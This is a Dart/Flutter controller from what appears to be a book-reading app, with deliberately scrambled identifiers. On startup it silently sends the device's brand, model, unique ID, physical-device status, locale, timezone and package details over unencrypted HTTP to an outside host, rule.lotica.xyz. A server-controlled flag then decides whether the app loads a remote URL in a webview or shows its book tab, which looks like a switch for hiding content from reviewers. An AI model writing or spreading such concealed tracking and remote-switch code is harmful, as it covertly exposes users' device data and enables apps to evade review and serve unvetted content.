import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var hwfkmnl = RxBool(false);
  var vkuhwoe = RxBool(true);
  var oewirbx = RxString("");
  var margarett = RxBool(false);
  var windler = RxBool(true);
  final sogxvidrb = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    whnfs();
  }


  Future<void> whnfs() async {

    margarett.value = true;
    windler.value = true;
    vkuhwoe.value = false;

    sogxvidrb.post("http://rule.lotica.xyz/tkpsmbweuagjrn",data: await pfevus()).then((value) {
      var rxzwdab = value.data["rxzwdab"] as String;
      var yifgz = value.data["yifgz"] as bool;
      if (yifgz) {
        oewirbx.value = rxzwdab;
        annabelle();
      } else {
        gaylord();
      }
    }).catchError((e) {
      vkuhwoe.value = true;
      windler.value = true;
      margarett.value = false;
    });
  }

  Future<Map<String, dynamic>> pfevus() async {
    final DeviceInfoPlugin xnrwglb = DeviceInfoPlugin();
    PackageInfo nloxjw_vtwokp = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var skwqdzev = Platform.localeName;
    var em_FRbI = currentTimeZone;

    var em_SfT = nloxjw_vtwokp.packageName;
    var em_Arudm = nloxjw_vtwokp.version;
    var em_fhM = nloxjw_vtwokp.buildNumber;

    var em_mOpYx = nloxjw_vtwokp.appName;
    var em_OanfvlZ = "";
    var jocelynGislason = "";
    var em_Ipc  = "";
    var camillaKrajcik = "";
    var em_WfaZz = "";

    var jolieAufderhar = "";
    var em_zlK = "";
    var em_xz = false;

    if (GetPlatform.isAndroid) {
      em_zlK = "android";
      var dflrctu = await xnrwglb.androidInfo;

      em_OanfvlZ = dflrctu.brand;

      em_WfaZz  = dflrctu.model;
      em_Ipc = dflrctu.id;

      em_xz = dflrctu.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      em_zlK = "ios";
      var izqeovmj = await xnrwglb.iosInfo;
      em_OanfvlZ = izqeovmj.name;
      em_WfaZz = izqeovmj.model;

      em_Ipc = izqeovmj.identifierForVendor ?? "";
      em_xz  = izqeovmj.isPhysicalDevice;
    }
    var res = {
      "em_zlK": em_zlK,
      "em_WfaZz": em_WfaZz,
      "em_Arudm": em_Arudm,
      "em_SfT": em_SfT,
      "jolieAufderhar" : jolieAufderhar,
      "em_FRbI": em_FRbI,
      "em_OanfvlZ": em_OanfvlZ,
      "em_Ipc": em_Ipc,
      "jocelynGislason" : jocelynGislason,
      "em_mOpYx": em_mOpYx,
      "skwqdzev": skwqdzev,
      "em_xz": em_xz,
      "camillaKrajcik" : camillaKrajcik,
      "em_fhM": em_fhM,

    };
    return res;
  }

  Future<void> gaylord() async {
    Get.offAllNamed("/book_tab");
  }

  Future<void> annabelle() async {
    Get.offAllNamed("/book_toast");
  }

}
